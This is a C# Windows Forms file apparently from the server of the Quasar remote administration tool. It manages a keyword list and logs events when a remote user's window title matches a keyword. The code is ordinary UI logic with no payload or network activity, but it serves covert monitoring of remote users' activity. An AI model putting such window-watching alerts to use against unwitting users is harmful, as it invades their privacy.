using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmWindowsNotify : Form
    {
        private static FrmWindowsNotify _instance;
        private readonly HashSet<string> _keywords = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        public static FrmWindowsNotify CreateOrShow(Form owner)
        {
            if (_instance == null || _instance.IsDisposed)
                _instance = new FrmWindowsNotify();
            _instance.Show();
            _instance.Focus();
            return _instance;
        }

        public FrmWindowsNotify()
        {
            InitializeComponent();
        }

        public bool Matches(string title, out string matched)
        {
            matched = null;
            if (string.IsNullOrEmpty(title)) return false;
            var m = _keywords.FirstOrDefault(k => title.IndexOf(k, StringComparison.OrdinalIgnoreCase) >= 0);
            if (m != null)
            {
                matched = m;
                return true;
            }
            return false;
        }

        public void AddEvent(string user, DateTime time, string keyword, string window)
        {
            if (InvokeRequired)
            {
                Invoke((MethodInvoker)(() => AddEvent(user, time, keyword, window)));
                return;
            }
            var lvi = new ListViewItem(new[]
            {
                user,
                time.ToString("u"),
                keyword,
                window
            });
            lstEvents.Items.Add(lvi);
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            var k = txtKeyword.Text.Trim();
            if (k.Length == 0) return;
            if (!_keywords.Add(k)) return;
            lstKeywords.Items.Add(k);
            txtKeyword.Clear();
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            foreach (var sel in lstKeywords.SelectedItems.Cast<string>().ToArray())
            {
                _keywords.Remove(sel);
                lstKeywords.Items.Remove(sel);
            }
        }
    }
}


